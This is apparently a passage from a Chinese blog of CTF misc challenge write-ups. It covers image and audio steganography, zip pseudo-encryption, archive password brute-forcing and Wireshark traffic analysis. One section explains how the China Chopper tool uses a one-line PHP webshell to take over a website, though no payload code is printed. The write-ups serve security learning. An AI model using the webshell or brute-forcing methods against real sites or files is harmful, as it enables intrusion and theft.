src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126004943690.png" alt="image-20211126004943690"></p><p>解压，拿到flag！</p><h3 id="你竟然赶我走！"><a href="#你竟然赶我走！" class="headerlink" title="你竟然赶我走！"></a>你竟然赶我走！</h3><p>hahaha，看看附件：</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/biubiu.jpg" style="zoom:50%;"><p>没啥可说的，010或者hex一看有惊喜</p><h3 id="有N种方法解决"><a href="#有N种方法解决" class="headerlink" title="有N种方法解决"></a>有N种方法解决</h3><p>呐，这个附件打不开！！！—— 用010堪堪罢，惊喜出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(5).png"></p><p>编码开始的地方似乎是让我们把这些base64编码转成图像，说干就干！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010508963.png" alt="image-20211126010508963"></p><p>扫一扫，得到答案！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126010624861.png" alt="image-20211126010624861" style="zoom:33%;"><h3 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h3><p>下载附件如图：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126011348020.png" alt="image-20211126011348020"></p><p>又时候，题干很重要，”看不到图？是不是屏幕太小了“——图片的长宽或许有问题！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012245141.png" alt="image-20211126012245141" style="zoom:33%;"><p>根据这个，我们通过010调整宽高，成功获得完整图片，你说flag在哪里呐😍</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012749979.png" alt="image-20211126012749979" style="zoom:50%;"><h4 id="PNG文件分析"><a href="#PNG文件分析" class="headerlink" title="PNG文件分析"></a><font color="red" size="5"><strong>PNG文件分析</strong></font></h4><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126012915721.png" alt="image-20211126012915721" style="zoom:50%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126013036241.png" alt="image-20211126013036241" style="zoom:67%;"><h3 id="基础破解"><a href="#基础破解" class="headerlink" title="基础破解"></a>基础破解</h3><p>emmm…都提示暴力破解了，那就乖乖暴力破解吧。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014055933.png" alt="image-20211126014055933" style="zoom: 50%;"><p>嘿嘿嘿🤭，爆破出来了！</p><p>解压文件，得到一段base64编码，转换即有flag！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126014623349.png" alt="image-20211126014623349" style="zoom: 33%;"><h3 id="乌镇峰会种图"><a href="#乌镇峰会种图" class="headerlink" title="乌镇峰会种图"></a>乌镇峰会种图</h3><p>图片里有啥信息？没啥好吧，010或者hex一看就ok</p><h3 id="文件中的秘密"><a href="#文件中的秘密" class="headerlink" title="文件中的秘密"></a>文件中的秘密</h3><p>emmm…不是我不想写，而是没啥可写，球球你康康属性吧。。。</p><h3 id="LSB"><a href="#LSB" class="headerlink" title="LSB"></a>LSB</h3><p>lsb嘛，stegsolve康一康，发现以下三幅图I里都有一些竖形：</p><div align="center"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (9).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (10).png" style="zoom: 70%;"><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26 (11).png" style="zoom: 70%;"></div><p>Data Extract</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-26%20(12).png" style="zoom:50%;"><p>提示了PNG，我们将其save bin为PNG图片，得到二维码，扫描即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/1.png"></p><h3 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a><font color="blue">Wireshark</font></h3><p>分析流量包，自然是使用wireshark了！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224306932.png" alt="image-20211126224306932" style="zoom: 80%;"><p>emmm…该看啥啊？</p><h4 id="划重点"><a href="#划重点" class="headerlink" title="划重点"></a><font color="red"><strong>划重点</strong></font></h4><p>经过查询之后，了解到了题目中“黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案)”给了不止一个提示——<font color="red"><strong>登录用到的请求方式是POST或GET，一般网站采取POST方式（出于安全考虑），故先用POST为条件进行筛选</strong></font>筛选语句如下：</p><blockquote><p>http.request.method==POST</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224745090.png" alt="image-20211126224745090"></p><p>只有一条！追踪其TCP流即可找到password，即flag</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211126224917569.png" alt="image-20211126224917569"></p><h3 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h3><p>告诉4位数字了，爆破就完了呗，拜拜</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/Quicker_20211126_190251.png"></p><h3 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a><font color="blue">zip伪加密</font></h3><h4 id="压缩包文件分析："><a href="#压缩包文件分析：" class="headerlink" title="压缩包文件分析："></a><font color="red" size="5"><strong>压缩包文件分析</strong></font>：</h4><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011559649.png" alt="image-20211127011559649"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011629241.png" alt="image-20211127011629241"></p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127011701328.png" alt="image-20211127011701328"></p><p>依据上述知识点，我们打开010</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211127012016868.png" alt="image-20211127012016868"></p><p>发现前后各有1个09，伪加密木大错，都改为0000即可,之后就会发现压缩包可以加压力，里面的文件里就是flag</p><h3 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h3><p>真就是：“二维码，谁用谁知道”，拜拜~</p><h3 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h3><p>提到流量分析，自然又是wireshark！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211128141314047.png" alt="image-20211128141314047"></p><p>过滤</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211128141343330.png" alt="image-20211128141343330"></p><p>flag出来了。</p><h3 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h3><p>这个题啊，镜子里面啊，想隐写啊。<del>（010、binwalk找不出啥来才想的🐶,）</del></p><p>LSB!!!!!!!!!!!!!!!!!!!!!!!!!!!!!</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/2021-11-27.png" alt="2021-11-27"></p><h3 id="ningen"><a href="#ningen" class="headerlink" title="ningen"></a>ningen</h3><p>得到图片，010和属性都没看出啥，于是binwalk，发现图片里面存在一个压缩包，提取即可。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/binwalk.png" alt="binwalk"></p><p>提取出来，爆破即可。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E7%88%86%E7%A0%B4.png" alt="爆破"></p><p>里面的文档即使flag</p><h3 id="小明的保险箱"><a href="#小明的保险箱" class="headerlink" title="小明的保险箱"></a>小明的保险箱</h3><p>,,,跟上一个题不能说完全相似也只能说一模一样了，密码放在下面，溜了</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129164902137.png" alt="image-20211129164902137"></p><h3 id="爱因斯坦"><a href="#爱因斯坦" class="headerlink" title="爱因斯坦"></a>爱因斯坦</h3><p>拿到题后，习惯性看一下属性，发现有一点值得注意的地方</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129165526695.png" alt="image-20211129165526695" style="zoom:50%;"><p>暂且放下，之后010看一看，binwalk看一看，出来个压缩包，唉唉，没密码怎么办？？？</p><p>抱着试一试的想法，填上备注的信息，有惊喜哦，哎嘿。</p><h3 id="easycap"><a href="#easycap" class="headerlink" title="easycap"></a>easycap</h3><p>emmm…全都是TCP流有啥意思，我一个基本不会使wireshark的萌新直接追踪一下流flag就出来了、、、</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129181440188.png" alt="image-20211129181440188"></p><h3 id="隐藏的钥匙"><a href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h3><p>呐呐呐，属性、010，wait！010真的找出了东西哎！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129170005565.png" alt="image-20211129170005565"></p><p>依据提示，base64转码即可</p><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p>属性，010，这次，我们又在010里找到了不寻常的地方</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129172208458.png" alt="image-20211129172208458"></p><p>一串2进制编码！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129172358141.png" alt="image-20211129172358141"></p><p>解码即可。</p><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175426237.png" alt="image-20211129175426237"></p><p>在属性、010、binwalk无果后，我们来试试stegsolve，盲猜lsb（我只知道这个🐕）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175853648.png" alt="image-20211129175853648"></p><p>左面似乎啥也没有，但我们在右面发现了重头戏！504B0304，不是压缩包的文件头吗！！！果断将其保存为哦压缩文件，暂且无视bandizip的损坏提醒，解压下来堪堪——这是啥？？？！！！</p><p>一头雾水的我选择使用file命令辨别其文件类型</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129180422750.png" alt="image-20211129180422750"></p><p>elf文件，这真的是道misc，不是pwn？？？</p><p>ida打开，堪堪main函数，神奇的事情出现了！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129180541272.png" alt="image-20211129180541272"></p><p>ok，解决了</p><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>ctfer当真啥都要会啊。。。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/pic.jpg" alt="pic"></p><p>别问，问就是盲文</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/202009091617300.png" alt="202009091617300"></p><p>解出来是“kmdonowg”，很明显是解压码，解压音频，拖入audacity，观察波形图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175146065.png" alt="image-20211129175146065"></p><p>别问，问就是摩斯电码（一边对着一边打，眼要瞎了）</p><blockquote><p>-.-.  -  ..-.  .–  .–.  .  ..  —–  —..  –…  …–  ..—  ..–..  ..—  …–  -..  –..</p></blockquote><p>线上解码即可</p><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p>依照题目所给信息爆破</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E.png" alt="神秘龙卷风" style="zoom:50%;"><p>打开压缩包文本，发现神秘龙卷风</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083144863.png" alt="image-20211130083144863" style="zoom: 33%;"><p>很明显是brainfuck，在线解码即可</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083228685.png" alt="image-20211130083228685" style="zoom:67%;"><h3 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h3><p>后门查杀，就查杀后门呗😓</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181414306.png" alt="image-20211202181414306"></p><p>题目已经提醒了密码即为flag，搜索pass，即可找到</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181722647.png" alt="image-20211202181722647"></p><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>题目要交流内容，交流内容大概率是文本，因此我们把目标放在http协议上，过滤后，得到了以下四个。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202180930267.png" alt="image-20211202180930267"></p><p>emmm，接下来我是一个个看的😂，最后在返回页面的那个流里发现了不同的东西—好长一段编码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181046389.png" alt="image-20211202181046389"></p><p>bae64解码，flag出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181203879.png" alt="image-20211202181203879"></p><h3 id="荷兰带宽数据泄露"><a href="#荷兰带宽数据泄露" class="headerlink" title="荷兰带宽数据泄露"></a>荷兰带宽数据泄露</h3><p>下载附件之后得到.bin文件，起初并不知道该怎么看，经过查找资料、例题之后，发现这是一个路由器信息恢复类问题，答案可能是username或者password，ctrl+F，果然是username。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202174931265.png" alt="image-20211202174931265"></p><h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><p>音频隐写，拖进audacity，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083902936.png" alt="image-20211130083902936"></p><p>明显的摩斯</p><blockquote><p>… -… -.-. —-. …— … -… …- —-. -.-. -… —– .—- —… —… …-. … …— . -… .—- –… -… –… —– —-. …— —-. .—- —-. .—- -.-.</p></blockquote><p>在线转码即可出flag</p><h3 id="Webshell后门"><a href="#Webshell后门" class="headerlink" title="Webshell后门"></a>Webshell后门</h3><p>emmm，这题和上面的某个题不能说一模一样，也只能说基本类似了，是哪个题我不说🤐</p><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>属性里有ps，打开之后无果，010没有思路，最后使用binwalk，发现了压缩包！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130084916891.png" alt="image-20211130084916891" style="zoom:50%;"><p>但当我们兴高采烈的准备爆破时</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130085128897.png" alt="image-20211130085128897"></p><p>为什么呢？—— 联系前面做题的经验，我们猜测是伪加密</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130092850611.png" alt="image-20211130092850611"></p><p>果然是，我们将其更改，如上图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130093034197.png" alt="image-20211130093034197" style="zoom:50%;"><p>在试过多种方法后，我仍然一头雾水，最终在wp的帮助下解决此题（惭愧）</p><p>原来是把文件当压缩文件！</p><h4 id="7Z命令"><a href="#7Z命令" class="headerlink" title=" 7Z命令"></a><font color="red" size="5"> <strong>7Z命令</strong></font></h4><p><img src="https://www.icode9.com/i/ll/?i=2020112809574741.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTQ2Mzg1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以发现，文件就在其中一个压缩包里，密码爆破没给提示，只能从图片入手了，但是，属性、010、binwalk在图片里都没发现有用的东西，最终还是借助wp才做出这道题</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225316574.png" alt="image-20211130225316574"></p><p>提取出了多个文件夹，其中两个明显提示有flag</p><p>one</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225443219.png" alt="image-20211130225443219"></p><p>two</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225509800.png" alt="image-20211130225509800"></p><p>解码即可</p><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p>下载好图片后，属性没提示，但在010里搜flag发现了一些东西</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130305519.png" alt="image-20211130130305519"></p><p>估计flag就在这个文档里，走，上binwalk！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130511145.png" alt="image-20211130130511145" style="zoom:50%;"><p>里面果然还有东西，把他们都提取出来</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130838874.png" alt="image-20211130130838874"></p><h4 id="steghide的使用"><a href="#steghide的使用" class="headerlink" title="steghide的使用 "></a><font color="red" size="5"><strong>steghide的使用</strong> </font></h4><p>steghide的使用</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/20191006095037382.png" alt="img"></p><p>使用后，我们发现，出现了“ko.txt”这个文件，而它正是压缩包的密码，解压后，打开文档，本题结束。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130131701943.png" alt="image-20211130131701943" style="zoom:50%;"><h3 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h3><p>wireshark查看，从题目中“MD5”和“哈希”一下，我们可以推测我们要找的大概率是文本，因此我们优先追踪http流，果然不出所料。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002614033.png" alt="image-20211207002614033"></p><p>嗯，然后随波逐流哈希一下，嗯</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002552573.png" alt="image-20211207002552573"></p><p>此即为flagヾ(≧▽≦*)o</p><h3 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h3><p>提到键盘上的刷新，自然想到F5键，由此我们确定了本题的隐写方式——F5隐写</p><h4 id="F555"><a href="#F555" class="headerlink" title="F555"></a><font color="red"><strong>F555</strong></font></h4><blockquote><p>java Extract “待提取的图片路径”</p></blockquote><p>即会提取出其中文件，如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211206235445647.png" alt="image-20211206235445647"></p><p>我们查看解出的文件，发现一堆乱码，便怀疑不是文本文件，于是用file一看，果然不是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207000820364.png" alt="image-20211207000820364"></p><p>拖到win里更改后缀，发现解压需要解压码，于是去爆破</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002648795.png" alt="image-20211207002648795"></p><p>为什么没有文件？—— 依照前面的经验，怀疑是伪加密</p><p>果然是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207003202319.png" alt="image-20211207003202319"></p><p>解出来了！！！睡觉！！！</p><h3 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h3><p>属性没啥东西哦，然后堪堪010，结果发现以下·信息</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207081456197.png" alt="image-20211207081456197"></p><p>但是——没啥用，还是老老实实binwalk吧</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207081923254.png" alt="image-20211207081923254" style="zoom: 67%;"><p>提取出的文件如下所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207082040847.png" alt="image-20211207082040847"></p><p>cipher里一堆乱码，看key，key里是如下文本</p><blockquote><p>V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</p></blockquote><p>明显的base64，解码得</p><blockquote><p>What is Nicki Minaj’s favorite song that refers to snakes?</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207082546271.png" alt="image-20211207082546271"></p><p>想来应该key是Anaconda(水蚺—南美洲蟒蛇)，但问题又来了，这是个什么编码？？？</p><p>最后经过查看WP，才知晓，这是一种名为“Serpent (蛇; 尤指大蛇;)”，合着这题真就snake了</p><h4 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a><font color="red"><strong>Serpent</strong></font></h4><blockquote><p>在线解码网址：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207084605840.png" alt="image-20211207084605840"></p><p>flag解出。</p><h3 id="认真你就输了"><a href="#认真你就输了" class="headerlink" title="认真你就输了"></a>认真你就输了</h3><p>下载得到xls文件，打开时提示文件错误，于是用010一看</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207163333416.png" alt="image-20211207163333416"></p><p>有戏！！！</p><p>binwalk -e一下，压缩包没加密，解压完找到文件即可</p><h3 id="藏藏藏"><a href="#藏藏藏" class="headerlink" title="藏藏藏"></a>藏藏藏</h3><p>属性、010都没啥，用binwalk发现有zip，解压即可得到二维码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207173626114.png" alt="image-20211207173626114"></p><h3 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h3><p>又是流量分析，祭出wireshark，根据题目所给提示我们应该<font color="red"><strong>查找ftp来看文件传输</strong></font>，如下所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207174256544.png" alt="image-20211207174256544"></p><p>将文件提取出来，目标即是rar文件，因此使用binwalk命令进行分解，得到压缩包，需要密码？</p><p>爆破即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207174638285.png" alt="image-20211207174638285"></p><p>此题结束。</p><h3 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h3><h4 id="菜刀与一句话木马"><a href="#菜刀与一句话木马" class="headerlink" title=" 菜刀与一句话木马"></a><font color="red"> <strong>菜刀与一句话木马</strong></font></h4><p>有个菜刀叫中国菜刀，有个木马叫一句话木马，因为隐蔽且传输量大，一般工具都是<em><strong>POST</strong></em>方式传参，所以一句话一般写_POST，把这个一句话木马挂到一个网页上，用‘菜刀’连接这一句话木马，一旦它运行，凭借这一句话木马就可以获取网站的管理权限。</p><p>由上可知，我们需要看其post，直接追踪http流</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207222718294.png" alt="image-20211207222718294"></p><p>发现了好东西！</p><h3 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h3><p>压缩包直接打不开？爆破不显示文件？</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180029534.png" alt="image-20211207180029534"></p><p>应该是伪加密吧。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180229245.png" alt="image-20211207180229245">、</p><p>果然是！</p><p>提取压缩包之后，我们发现有文本文件</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180421933.png" alt="image-20211207180421933"></p><p>与佛论禅！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180357026.png" alt="image-20211207180357026"></p><p>论完了，出来了</p><h3 id="你猜我是个啥"><a href="#你猜我是个啥" class="headerlink" title="你猜我是个啥"></a>你猜我是个啥</h3><p>压缩包打开显示格式错误，直接上010堪堪，惊喜出现了！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207225626941.png" alt="image-20211207225626941"></p><h3 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h3><p>这个题…恶心人！！！<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QQ%E5%9B%BE%E7%89%8720211208174259.jpg" alt="QQ图片20211208174259"></p><p>先扫描神奇的二维码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208174423132.png" alt="image-20211208174423132"></p><p>嗯，神奇之处其在于它一点都不神奇，010无事，上binwalk</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208174527392.png" alt="image-20211208174527193"></p><p>提取出来之后（做完再写的wp，可能有的删了）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208174557025.png" alt="image-20211208174557025"></p><p>encode内容如下：</p><blockquote><p>YXNkZmdoamtsMTIzNDU2Nzg5MA==</p></blockquote><p>明显的base64，解码如下：</p><blockquote><p>asdfghjkl1234567890</p></blockquote><p>用这个我们能解压出另一个文件（好像是文档？）</p><p>然后最讨厌的第一个地方来了，里面是一段超~长的base64，接下来解码极其烦人，大约套了20层，下面展示两张</p><table frame="void">    <!--使用table标签，且frame=void消除外边框-->    <tr>           <!--<tr>一行的内容<\tr>，<td>一个格子的内容<\td>-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208175731349.png" alt="第一张图片显示不出时显示的文字" height="填数字作为高度"></center></td>    <!--<center>标签将图片居中-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208175842545.png" alt="第二张图片显示不出时显示的文字" height="高度一致会好看"></center></td>    </tr></table><p>出来的——还不是flag！！！<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QQ%E5%9B%BE%E7%89%8720211208174259.jpg" alt="QQ图片20211208174259"></p><p>解压音频文件，au一看</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208180058079.png" alt="image-20211208180058079"></p><p>呦，这不是最——最讨人厌的摩斯吗？？？！！！🐶</p><p>消耗眼睛手打</p><blockquote><p>–/—/.-./…/./…/…/…-/./.-./-.–/…-/./.-./-.–/./.-/…/-.–</p></blockquote><p>网站解码即可，flag出现！！！</p><h4 id="morse2ascii"><a href="#morse2ascii" class="headerlink" title="morse2ascii"></a><font color="red"><strong>morse2ascii</strong></font></h4><p>看wp时发现，大佬是这样做的：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208180416334.png" alt="image-20211208180416334"></p><h4 id="BASECRACK！"><a href="#BASECRACK！" class="headerlink" title="BASECRACK！"></a><font color="red"><strong>BASECRACK！</strong></font></h4><p>原来有个工具叫basecrack！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209224015724.png" alt="image-20211209224015724"></p><h3 id="一叶障目"><a href="#一叶障目" class="headerlink" title="一叶障目"></a>一叶障目</h3><p>解压文件后，PNG图片能够正常打开，属性也没问题，用010堪堪</p><p>提示这个</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209083542429.png" alt="image-20211209083542429"></p><p>经查找，发现这个错误一般都是修改宽高造成的，所以我们修改宽高</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209083922329.png" alt="image-20211209083922329"></p><p>ok</p><h3 id="just-a-rar"><a href="#just-a-rar" class="headerlink" title="just_a_rar"></a>just_a_rar</h3><p>解压——爆破——解压——属性——flag</p><h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>下下来之后，发现两个后缀都为gif的附件，属性没有问题，打开010查看，发现副本报错，因为都是gif文件，对比后发现副本没有文件头，添加上去，即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211211101258140.png" alt="image-20211211101258140"></p><h3 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h3><p>拖入au</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210202502628.png" alt="image-20211210202502628"></p><p>思路一：不就是摩斯？直接手打，解码即可</p><p>思路二：分离声道，kali分析（没想起来，做完看的WP哈哈哈）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210202647450.png" alt="image-20211210202647450"></p><h3 id="纳尼"><a href="#纳尼" class="headerlink" title="纳尼"></a>纳尼</h3><p>属性无问题，文件打不开，堪堪010，果然，缺少文件头，补上，可以打开。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/6.gif" alt="6" style="zoom: 50%;"><p>动图内容如下</p><blockquote><p>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</p></blockquote><p>明显的base64，解码即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211211102340120.png" alt="image-20211211102340120"></p><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><h4 id="outguess-1"><a href="#outguess-1" class="headerlink" title="outguess"></a><font 